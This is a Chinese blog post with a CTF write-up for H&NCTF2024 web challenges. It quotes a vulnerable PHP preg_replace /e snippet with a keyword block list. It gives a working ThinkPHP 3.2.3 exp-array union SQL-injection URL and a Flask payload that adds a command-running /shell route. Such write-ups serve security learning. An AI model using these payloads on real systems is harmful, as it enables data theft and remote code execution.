
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>H&NCTF2024 - hybcx's blog</title>

  
    <meta name="description" content="WEB-Please_RCE_Me &lt;?php if($_GET[&#39;moran&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;){     highlight_file(__FILE__);     if(isset($_POST[&#39;task&#39;])&amp;&amp;isset($_POST[&#39;flag&#39;])){         $str1 &#x3D; $_POST[&#39;task&#39;];         $str2 &#x3D; $_">
<meta property="og:type" content="article">
<meta property="og:title" content="H&amp;NCTF2024">
<meta property="og:url" content="http://hybcx.xyz/2024/05/12/h-nctf2024/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="WEB-Please_RCE_Me &lt;?php if($_GET[&#39;moran&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;){     highlight_file(__FILE__);     if(isset($_POST[&#39;task&#39;])&amp;&amp;isset($_POST[&#39;flag&#39;])){         $str1 &#x3D; $_POST[&#39;task&#39;];         $str2 &#x3D; $_">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127106.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127107.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127109.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240516205502920.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240516213332073.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526194331940.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526194426920.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526195128794.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526201613362.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526201920548.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204210150.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204602623.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204857025.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526205049267.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211356592.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211415154.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211736562.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526212534120.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526212757779.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526214040736.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527174638870.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527174829543.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527180149263.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527181329398.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527182138528.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185137298.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185216188.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185750296.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527190229348.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527202713128.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527202721909.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527203007810.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527203038006.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527214316741.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527215939107.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527220555791.png">
<meta property="og:image" content="d:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527223132673.png">
<meta property="article:published_time" content="2024-05-12T00:08:05.000Z">
<meta property="article:modified_time" content="2024-05-28T02:23:44.714Z">
<meta property="article:author" content="hybcx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127106.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa index tech" id="start" layout="posts" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets"></div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">

<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>



<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>

  <span class="sep"></span>
  <a class="cap breadcrumb" href="/2024/05/12/h-nctf2024/">H&NCTF2024</a>
  </div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-12T00:08:05.000Z">2024-05-12</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-05-28T02:23:44.714Z">2024-05-28</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>H&NCTF2024</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="web-please_rce_me">WEB-Please_RCE_Me</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'moran'</span>] === <span class="hljs-string">'flag'</span>){
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'task'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'flag'</span>])){
        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'task'</span>];
        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'flag'</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i'</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/please_give_me_flag/'</span>,<span class="hljs-variable">$str2</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!'</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/please_give_me_flag/ei"</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'task'</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'flag'</span>]);
        }
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"moran want a flag.&lt;/br&gt;(?moran=flag)"</span>;
}</code></pre>
<p>利用动态函数+正则绕过，正则用大写绕过即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127106.png" alt="image-20240513184232026"></p>
<h1 id="web-ez_tp">WEB-ez_tp</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127107.png" alt="image-20240513184342149"></p>
<p>代码审计，发现name参数存在tp3.2.3 exp的sql注入，这里用联合注入即可</p>
<p>至于waf这里过滤的不严格，很简单，定位这题的控制函数，payload如下</p>
<p>这里函数是h_n</p>
<pre><code class="hljs php">url/index.php/home/index/h_n?name[<span class="hljs-number">0</span>]=exp&amp;name[<span class="hljs-number">1</span>]=%<span class="hljs-number">3</span>d%<span class="hljs-number">27</span>test123%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,flag%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>flag</code></pre>
<p>这里由于还检查了cookie头，用bp删一些过滤字符即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202405132127109.png" alt="image-20240513184601192"></p>
<p>这里再复现一波tp，不过是简单的复现，后面学PHP代审的时候再细看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240516205502920.png" alt="image-20240516205502920"></p>
<p>这里可以看到，过了waf就执行else，里面是</p>
<p>用于获取输入数据，如 <code>$_GET、$_POST、$_REQUEST、$_SESSION、$_COOKIE</code> 等超全局数组中的数据。这个方法主要用于简化和加强对输入数据的处理，提供了一种更安全、更便捷的方式来访问用户输入。</p>
<p>基本用法</p>
<p><code>I()</code> 方法的基本用法如下：</p>
<pre><code class="hljs scss"><span class="hljs-variable">$data</span> = <span class="hljs-selector-tag">I</span>('变量类型.变量名/过滤方法/默认值', 默认值, 过滤方法);</code></pre>
<ul>
<li><strong>变量类型</strong>：指定要获取的数据的类型，如 <code>get</code>、<code>post</code>、<code>session</code>、<code>cookie</code> 等。如果不指定，默认为 <code>param</code>，表示按照 <code>GET</code>、<code>POST</code> 和 <code>COOKIE</code> 的顺序查找。</li>
<li><strong>变量名</strong>：要获取的变量的名称。</li>
<li><strong>过滤方法</strong>：对输入数据进行过滤的方法，可以是 PHP 的内置函数名，或者更复杂的过滤规则。==如果不指定，默认使用框架的全局过滤方法，通常是== ==<code>htmlspecialchars</code>==。</li>
<li><strong>默认值</strong>：如果指定的输入数据不存在时返回的默认值。</li>
</ul>
<p>示例：</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 获取GET参数id，不存在时默认为1</span>
<span class="hljs-variable">$id</span> = <span class="hljs-selector-tag">I</span>('get.id', <span class="hljs-number">1</span>);

<span class="hljs-comment">// 获取POST参数name，使用trim函数过滤</span>
<span class="hljs-variable">$name</span> = <span class="hljs-selector-tag">I</span>('post.name', '', 'trim');

<span class="hljs-comment">// 获取COOKIE参数name，不存在时默认为空字符串</span>
<span class="hljs-variable">$name</span> = <span class="hljs-selector-tag">I</span>('cookie.name', '');

<span class="hljs-comment">// 获取任意类型的参数name，优先级为GET、POST、COOKIE</span>
<span class="hljs-variable">$name</span> = <span class="hljs-selector-tag">I</span>('name');</code></pre>
<p>我们直接找到tp3.2.3原版 exp 注入位置<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240516213332073.png" alt="image-20240516213332073"></p>
<p>可以看到这里先是判断传入的val参数是否为数组，然后这里我们将val第一个元素赋值为exp，则就会进入红框中的elseif语句块，这里的whereStr参数直接拼接了key参数+空格+val数组的第二个元素</p>
<p>如果我们这样构造</p>
<pre><code class="hljs scss">?name<span class="hljs-selector-attr">[0]</span>=exp&amp;name<span class="hljs-selector-attr">[1]</span>==<span class="hljs-number">1</span> and test<span class="hljs-comment">//这里的值含有等于号</span></code></pre>
<p>其中上述代码的key就是这里的username，最终就是这个语句</p>
<pre><code class="hljs scss">username = <span class="hljs-number">1</span> and test</code></pre>
<p>直接union注入即可</p>
<h1 id="web-ezflask">WEB-ezFlask</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526194331940.png" alt="image-20240526194331940"></p>
<p>根据提示，直接访问的话，发现405：访问方法不被允许，猜测需要的是post给cmd传参</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526194426920.png" alt="image-20240526194426920"></p>
<p>最终payload为：最后访问shell路由即可</p>
<pre><code class="hljs scss">app<span class="hljs-selector-class">.add_url_rule</span>('/shell','shell',lambda:__import__('os')<span class="hljs-selector-class">.popen</span>('cat /flag')<span class="hljs-selector-class">.read</span>())</code></pre>
